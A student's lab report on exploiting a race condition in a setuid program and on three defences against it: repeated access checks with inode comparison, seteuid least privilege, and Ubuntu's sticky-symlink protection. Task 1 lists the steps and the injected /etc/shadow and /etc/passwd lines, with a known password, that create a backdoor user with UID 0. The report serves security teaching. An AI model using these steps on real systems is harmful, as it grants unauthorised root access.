James Bach 
Project 3

#########################################################################
Task 1: Exploit the Race Condition Vulnerabilities
#########################################################################
Overwrite any file that belongs to root
Gain root privileges

I have added entries to passwd and shadow using the attack_passwd.c and attack_shadow.c. They have small differences mainly which file is getting linked.

First create everything :

$make 

Run a temporary monitoring script:

$./check.sh 

Run the attack application for editing /etc/shadow:
$./attack_shadow & 

Then constantly try to run vuln until it does not give a "No permission error.":
eg
$./vuln < input_shadow 
$./vuln < input_shadow
$./vuln < input_shadow
..
..
$./vuln < input_shadow
$./vuln < input_shadow 

This will then respond with a:
"STOP... The shadow file has been changed"

input_shadow contains:
imrootuser:$6$OqXAiWQA$AIjctTUkHMECipE8EiAAJh76YZgrvadHKmWs3hQ3BU8vCC1bSVv4NhGWw2FsZ01LiZw0SL6Gc/p8Plw7ShkZR0:17247:0:99999:7:::

This entry corresponds to a new user named imrootuser with the password dees. The import part of this is also that the UID is 0 to give root control.

Stop this attack_shadow process, then switch to attack_passwd.
Likewise run, 
$./vuln < input_passwd
$./vuln < input_passwd
$./vuln < input_passwd
..
..
$./vuln < input_passwd
$./vuln < input_passwd

The corresponding entry of input_passwd makes the user official:
imrootuser:x:0:0:,,,:/home/imrootuser:/bin/bash

logging in with su imrootuser, password: dees, I can now use whoami and it returns root.

#########################################################################
Task 2:Protection Mechanism A: Repeating
#########################################################################
repeat access() and open() for several times
Will you be able to succeed? Explain and report observations.

In this particular set up I added a stat struct which enables access to the inodes. I then perform the accesses as mentioned and then compare the inode values again before opening the file. This is to ensure what the link was pointing to at the first point and then, check multiple times that this condition does not change, and then a final check upon success that the file intended to be checked is checked again based on the inode value.

/* inode struct*/
struct stat precheck, postcheck;

/*check inode before*/
lstat("/tmp/XYZ", &precheck);
if(!access(fn, W_OK)){
if(!access(fn, W_OK)){
if(!access(fn, W_OK)){
/*check inode after*/
lstat("/tmp/XYZ", &postcheck);
/*compare what i think i opened was opened*/
if (precheck.st_ino == postcheck.st_ino)
{
								
I was not able to succeed with this method in using race conditions. It provided a formidable block on my timing in getting access to the files. Comparing the inode values also made a little bit more confirmation that the file was indeed the correct one. I would say this is a reasonable protection mechanism.


#########################################################################
Task 3: Protection Mechanism B: Principle of Least Privilege
#########################################################################
seteuid syscall to disable root privilege and later enable if necessary
Will you be able to succeed? Explain and report observations.

Setting up a new addition to the code (in vuln3 from vulp3.c) I have added some
code that gets the current real user id and the effective user id. Then I set the permissions of the code to the real user before running the file opening parts which in this cases prevents root permissions. Then after access restore the effective user id.

//get current id states
uid_t ruid, euid;
ruid = getuid();
euid = geteuid();

//set real userid
seteuid(ruid);
/* ... file access ... */
//reset euid
seteuid(euid);

I was not able to get this method to succeed in any case either. This method prevents access by only allowing the effective user and not let them have permissions to root files. 


#########################################################################
Task 4: Protection Mechanism C: Ubuntu's Built-in Scheme
#########################################################################
Re-enable:
sudo sysctl -w kernel.yama.protected_sticky_symlinks=0
Will you be able to succeed? Explain and report observations.
Why does this protection scheme work? Is this a good protection, why or why not? What are the limitations of this scheme?


When this is activated, the program will segmentation fault when attempting to replace the permissions. Looking up this protection, I found http://www.openwall.com/lists/kernel-hardening/2011/11/18/1:
which mentions:
+When set to "0", symlink following behavior is unrestricted.
+
+When set to "1" symlinks are permitted to be followed only when outside
+a sticky world-writable directory, or when the uid of the symlink and
+follower match, or when the directory owner matches the symlink's owner.
+
+This protection is based on the restrictions in Openwall and grsecurity.

Thus in this situation, we violate this rule and segmentation fault since /etc/shadow and /etc/passwd are owned by root. 

This protection is useful in preventing undesired permissions but can also prevent valid uses such as limiting users to open files through links. Thus it is a good protection scheme but this is a limitation.

